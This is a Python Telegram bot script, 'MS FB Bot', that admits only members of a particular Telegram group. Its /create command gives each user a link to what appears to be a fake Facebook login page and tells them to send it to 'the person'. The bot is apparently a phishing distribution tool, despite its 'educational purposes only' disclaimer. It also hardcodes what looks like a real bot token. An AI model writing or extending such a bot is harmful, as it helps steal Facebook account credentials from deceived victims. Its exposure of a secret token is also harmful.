import logging
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Logging setup (for debugging)
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)

# Replace with your actual Telegram Bot Token
TOKEN = "7221082219:AAGw6htaypKVvU8RufM9NabvPN-9dgFH9xo"
GROUP_ID = -1002270426443  # Replace with your Telegram group ID

# Function to check if a user is in the group
async def check_membership(user_id):
    url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={GROUP_ID}&user_id={user_id}"
    try:
        response = requests.get(url).json()
        status = response.get("result", {}).get("status", "")
        return status in ["member", "administrator", "creator"]
    except Exception as e:
        logging.error(f"Error checking membership: {e}")
        return False

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if not await check_membership(user.id):
        await update.message.reply_text(
            "⚠ You must join our Telegram group first: https://t.me/ms_place"
        )
        return

    welcome_message = """✅ Welcome to 'MS FB Bot'!  
⚠ This bot is for educational purposes only!  

Available commands:  
🔹 /create - Get your unique link  
🔹 /clear - Clear chat history  
"""
    await update.message.reply_text(welcome_message)

# /create command
async def create(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📌 Send the link below to the person: \nhttps://v0-facebook-login.vercel.app/"
    )

# /clear command (Fixed)
async def clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Chat history cleared! (Note: I cannot delete private chat messages)")

# Main function
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("create", create))
    app.add_handler(CommandHandler("clear", clear))

    logging.info("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
